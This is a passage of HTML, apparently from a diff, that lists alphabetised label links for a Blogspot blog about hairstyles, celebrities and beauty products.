+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/perms'>perms</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/peta%20bunney'>peta bunney</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/photostream'>photostream</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Picture%20Galleries'>Picture Galleries</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pictures%20of%20Curly%20Hairstyles'>Pictures of Curly Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pink'>Pink</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pink%20dress'>Pink dress</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/pink%20hair'>pink hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pink.'>Pink.</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pinked%20by%20Lattouf'>Pinked by Lattouf</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pinkedby%20Lattouf'>Pinkedby Lattouf</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pixie%20Cut'>Pixie Cut</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pixie%20Haircuts'>Pixie Haircuts</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/plait'>plait</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/platinum%20blonde'>platinum blonde</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pony'>Pony</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/ponytail'>ponytail</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/powder%20bluff'>powder bluff</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Premier'>Premier</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/princess'>princess</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Priscilla%27s'>Priscilla&#39;s</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Privacy%20Policy'>Privacy Policy</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/product'>product</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/products'>products</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/project%20runway'>project runway</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/prom%20hairstyles'>prom hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Prostate'>Prostate</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/punk'>punk</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/punk%20girls%20hairstyle'>punk girls hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/punk%20hairstyle'>punk hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pure%20Lattouf'>Pure Lattouf</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Purple'>Purple</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/purple%20hair'>purple hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Pussycat%20Dolls'>Pussycat Dolls</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/races'>races</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Rachael%20Bilson'>Rachael Bilson</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Raspberry%20hair'>Raspberry hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Raspberry%20Red'>Raspberry Red</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/real%20hair%20extensions'>real hair extensions</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/red'>red</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Red%20and%20Black%20Hairstyles'>Red and Black Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Red%20Carpet'>Red Carpet</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Red%20Hair'>Red Hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Red%20Lips'>Red Lips</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/redcarpet'>redcarpet</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Reese%20Withersooon'>Reese Withersooon</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/relax'>relax</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Retro'>Retro</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/retro%20glamour'>retro glamour</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Retro%20hair'>Retro hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/retro%20men'>retro men</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/retro%20wave'>retro wave</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Rihanna'>Rihanna</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/RiRi'>RiRi</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/rockabilly%20hairstyles'>rockabilly hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/rockabilly%20hairstyles%20for%20women'>rockabilly hairstyles for women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/rockabilly%20hairstyles%20men'>rockabilly hairstyles men</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/rockabilly%20hairstyles%20tumblr'>rockabilly hairstyles tumblr</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/rockabilly%20hairstyles%20with%20bandana'>rockabilly hairstyles with bandana</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/roller%20set%20hair'>roller set hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/rollers'>rollers</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/rolling%20stone'>rolling stone</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/rose'>rose</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Rosie%20Huntington%20-%20Whiteley'>Rosie Huntington - Whiteley</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/ROYAL'>ROYAL</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Ruby%20Rose'>Ruby Rose</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/runway'>runway</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/sad'>sad</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Sarah%20De%20Bono'>Sarah De Bono</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/scenegirl'>scenegirl</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/sedu%20hairstyles'>sedu hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/sedu%20hairstyles%202013'>sedu hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/sedu%20hairstyles%20for%20women'>sedu hairstyles for women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/sedu%20prom%20hairstyles'>sedu prom hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/sedu%20short%20hairstyles'>sedu short hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Selena'>Selena</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Selena%20Gomez'>Selena Gomez</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/selena%20gomez%20hairstyle'>selena gomez hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/selena%20gomez%20hairstyles'>selena gomez hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Selena%20Gomez%20New%20Hairstyle%20Bob'>Selena Gomez New Hairstyle Bob</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/selena%20gomez%20short%20hairstyles'>selena gomez short hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/September'>September</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Session%20Spray'>Session Spray</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/session%20styling'>session styling</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/setting%20hair.'>setting hair.</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/sexy'>sexy</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Sexy%20hair'>Sexy hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Sexy%20Texture'>Sexy Texture</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Seyfried'>Seyfried</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Shaggy%20Bob%20Hairstyle'>Shaggy Bob Hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shaggy%20hairstyles'>shaggy hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shaggy%20hairstyles%202013'>shaggy hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shaggy%20hairstyles%20for%20long%20hair'>shaggy hairstyles for long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shaggy%20hairstyles%20for%20medium%20length%20hair'>shaggy hairstyles for medium length hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shaggy%20hairstyles%20for%20men'>shaggy hairstyles for men</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shaggy%20hairstyles%20for%20men%202013'>shaggy hairstyles for men 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shaggy%20hairstyles%20for%20men%20round%20faces'>shaggy hairstyles for men round faces</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shaggy%20hairstyles%20for%20men%20short'>shaggy hairstyles for men short</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shaggy%20hairstyles%20for%20men%20with%20curly%20hair'>shaggy hairstyles for men with curly hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shaggy%20hairstyles%20with%20bangs'>shaggy hairstyles with bangs</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Shaggy%20Layered%20Hairstyles'>Shaggy Layered Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shave'>shave</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Shiny%20hair'>Shiny hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/SHORT'>SHORT</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20%20emo%20hairstyle'>Short  emo hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20African%20American%20Hairstyles%202013'>Short African American Hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20Afro%20Hairstyles'>Short Afro Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20Black%20Hair%20Styles%202013'>Short Black Hair Styles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20Bob%20Hairstyles'>Short Bob Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20Brown%20Hairstyles'>Short Brown Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20Curly%20Afro%20Hairstyles'>Short Curly Afro Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/short%20curly%20hairstyles'>short curly hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/short%20hair'>short hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20Haircuts'>Short Haircuts</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/short%20haircuts%20for%20straight%20hair'>short haircuts for straight hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20Hairstyle'>Short Hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/short%20hairstyle%20for%20oval%20faces'>short hairstyle for oval faces</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/short%20hairstyle%20wavy%20hair'>short hairstyle wavy hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/short%20hairstyles'>short hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/short%20hairstyles%20for%20straight%20hair'>short hairstyles for straight hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20Layered%20Bob%20Hairstyles%20Women'>Short Layered Bob Hairstyles Women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/short%20mania'>short mania</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/short%20messy%20curly%20hairstyle'>short messy curly hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/short%20modern%20bob%20hairstyle'>short modern bob hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Short%20Straight%20Haircuts'>Short Straight Haircuts</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/shoulder%20length%20layered%20hairstyle'>shoulder length layered hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/side'>side</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Side%20Braid'>Side Braid</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/side%20part'>side part</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/side%20swept'>side swept</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/simple'>simple</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Skin%20care'>Skin care</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/skin%20treatment'>skin treatment</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/skincare'>skincare</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Sky%20Lobby'>Sky Lobby</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Sleek'>Sleek</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Sleek%20hair'>Sleek hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/smokey%20eye'>smokey eye</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Smooth%20and%20Shiny'>Smooth and Shiny</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Snooki'>Snooki</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Soft'>Soft</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/soft%20waves'>soft waves</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/sophisticated'>sophisticated</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/spring'>spring</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/spring%20choppy%20hairstyle'>spring choppy hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Spring%20Collection%202013'>Spring Collection 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/steps'>steps</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Straight'>Straight</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Straight%20Bob%20Cut'>Straight Bob Cut</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Straight%20Extensions'>Straight Extensions</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/straight%20hair'>straight hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/straight%20hairstyles'>straight hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/straight%20hairstyles%202013'>straight hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/straight%20hairstyles%20for%20long%20hair'>straight hairstyles for long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/straight%20hairstyles%20for%20prom'>straight hairstyles for prom</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/straight%20hairstyles%20for%20women'>straight hairstyles for women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/straight%20hairstyles%20tumblr'>straight hairstyles tumblr</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/straight%20hairstyles%20with%20bangs'>straight hairstyles with bangs</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/strength'>strength</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/studs'>studs</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/style'>style</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Style%20hair'>Style hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/style%20notes'>style notes</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Style%20Off'>Style Off</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/style%20revival'>style revival</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/styled'>styled</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/styling'>styling</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Styling%20Short%20Black%20Hair'>Styling Short Black Hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/stylish'>stylish</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/stylist%20of%20the%20year'>stylist of the year</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/summer'>summer</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/summer%20202'>summer 202</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/summer%20blonde'>summer blonde</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/summer%20hair'>summer hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Summer%20Style'>Summer Style</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/summer%20styles'>summer styles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Summer%20Trend'>Summer Trend</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Summer%20Wave'>Summer Wave</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Support'>Support</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Surfers%20Paradise'>Surfers Paradise</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Swarovski'>Swarovski</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Sydney'>Sydney</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Taylor%20Swift'>Taylor Swift</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/teens%20beautiful%20hairstyle'>teens beautiful hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Teriza%20Eid'>Teriza Eid</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/The%20dark%20world'>The dark world</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/The%20Journal.'>The Journal.</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/the%20met'>the met</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Thick%20Hair'>Thick Hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/thinning'>thinning</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Thor'>Thor</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/touch%20of%20colour'>touch of colour</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Trend'>Trend</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/trend%20alert'>trend alert</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/trending'>trending</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/trends'>trends</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/tutorial'>tutorial</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/twitter'>twitter</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Tyra%20Banks'>Tyra Banks</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/up%20style'>up style</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/up%20styles'>up styles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/updo'>updo</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/updo%20hairstyle'>updo hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Updo%20Hairstyles'>Updo Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/updo%20prom%20hairstyles'>updo prom hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/updo%20prom%20hairstyles%202013'>updo prom hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/updo%20prom%20hairstyles%20for%20black%20girls'>updo prom hairstyles for black girls</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/updo%20prom%20hairstyles%20for%20long%20hair'>updo prom hairstyles for long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/updo%20prom%20hairstyles%20for%20medium%20hair'>updo prom hairstyles for medium hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/updo%20prom%20hairstyles%20with%20braids'>updo prom hairstyles with braids</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Updos'>Updos</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/upstyle'>upstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Valentines%20Day'>Valentines Day</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Vanessa%20Hudgens'>Vanessa Hudgens</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/vanity%20fair'>vanity fair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/various%20asian%20hairstyle'>various asian hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/various%20prom%20hairstyle'>various prom hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Veronica'>Veronica</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Very%20Short%20Straight%20Haircuts'>Very Short Straight Haircuts</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/victoria%20beckham%20hairstyles'>victoria beckham hairstyles</a>
+</li>
+<li>
